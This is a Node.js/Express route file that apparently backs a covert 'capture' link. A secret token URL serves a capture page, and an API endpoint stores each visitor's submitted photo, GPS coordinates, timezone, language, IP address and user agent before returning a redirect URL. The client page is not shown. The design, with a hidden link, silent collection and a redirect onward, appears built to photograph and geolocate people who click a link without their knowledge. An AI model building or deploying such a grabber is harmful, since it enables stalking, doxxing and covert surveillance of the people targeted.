const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const express = require('express');

const { db, getSetting, UPLOADS_DIR } = require('../db');

const router = express.Router();

router.get('/r/:token', (req, res) => {
  const token = getSetting('entry_token');
  if (!token || req.params.token !== token) {
    return res.status(404).send('Not found');
  }
  res.sendFile(path.join(__dirname, '..', 'public', 'capture.html'));
});

const hits = new Map();

function rateLimit(ip) {
  const now = Date.now();
  const recent = (hits.get(ip) || []).filter((t) => now - t < 60000);
  if (recent.length >= 5) return false;
  recent.push(now);
  hits.set(ip, recent);
  return true;
}

const IMAGE_MAGIC = [
  { bytes: [0xff, 0xd8, 0xff], ext: '.jpg' },
  { bytes: [0x89, 0x50, 0x4e, 0x47], ext: '.png' },
  { bytes: [0x52, 0x49, 0x46, 0x46], ext: '.webp' },
];

function imageExt(buf) {
  for (const { bytes, ext } of IMAGE_MAGIC) {
    if (buf.length >= bytes.length && bytes.every((b, i) => buf[i] === b)) return ext;
  }
  return null;
}

router.post('/api/capture', (req, res) => {
  if (!rateLimit(req.ip)) {
    return res.status(429).json({ error: 'Too many requests' });
  }

  const { photo, referrer, lat, lng, tz, lang } = req.body || {};

  let filename = null;
  if (photo && typeof photo === 'string' && photo.length < 3000000) {
    try {
      const img = Buffer.from(photo.split(',')[1] || '', 'base64');
      const ext = imageExt(img);
      if (img.length > 0 && ext) {
        filename = `cap_${Date.now()}_${crypto.randomBytes(4).toString('hex')}${ext}`;
        fs.writeFileSync(path.join(UPLOADS_DIR, filename), img);
      }
    } catch (e) {
      filename = null;
    }
  }

  db.prepare(
    `INSERT INTO captures (filename, ip, user_agent, referrer, lat, lng, tz, lang)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`
  ).run(
    filename,
    req.ip,
    req.headers['user-agent'] || null,
    typeof referrer === 'string' ? referrer.slice(0, 2048) : null,
    Number.isFinite(lat) ? lat : null,
    Number.isFinite(lng) ? lng : null,
    typeof tz === 'string' ? tz.slice(0, 128) : null,
    typeof lang === 'string' ? lang.slice(0, 64) : null
  );

  res.json({ destinationUrl: getSetting('destination_url') || '/' });
});

module.exports = router;
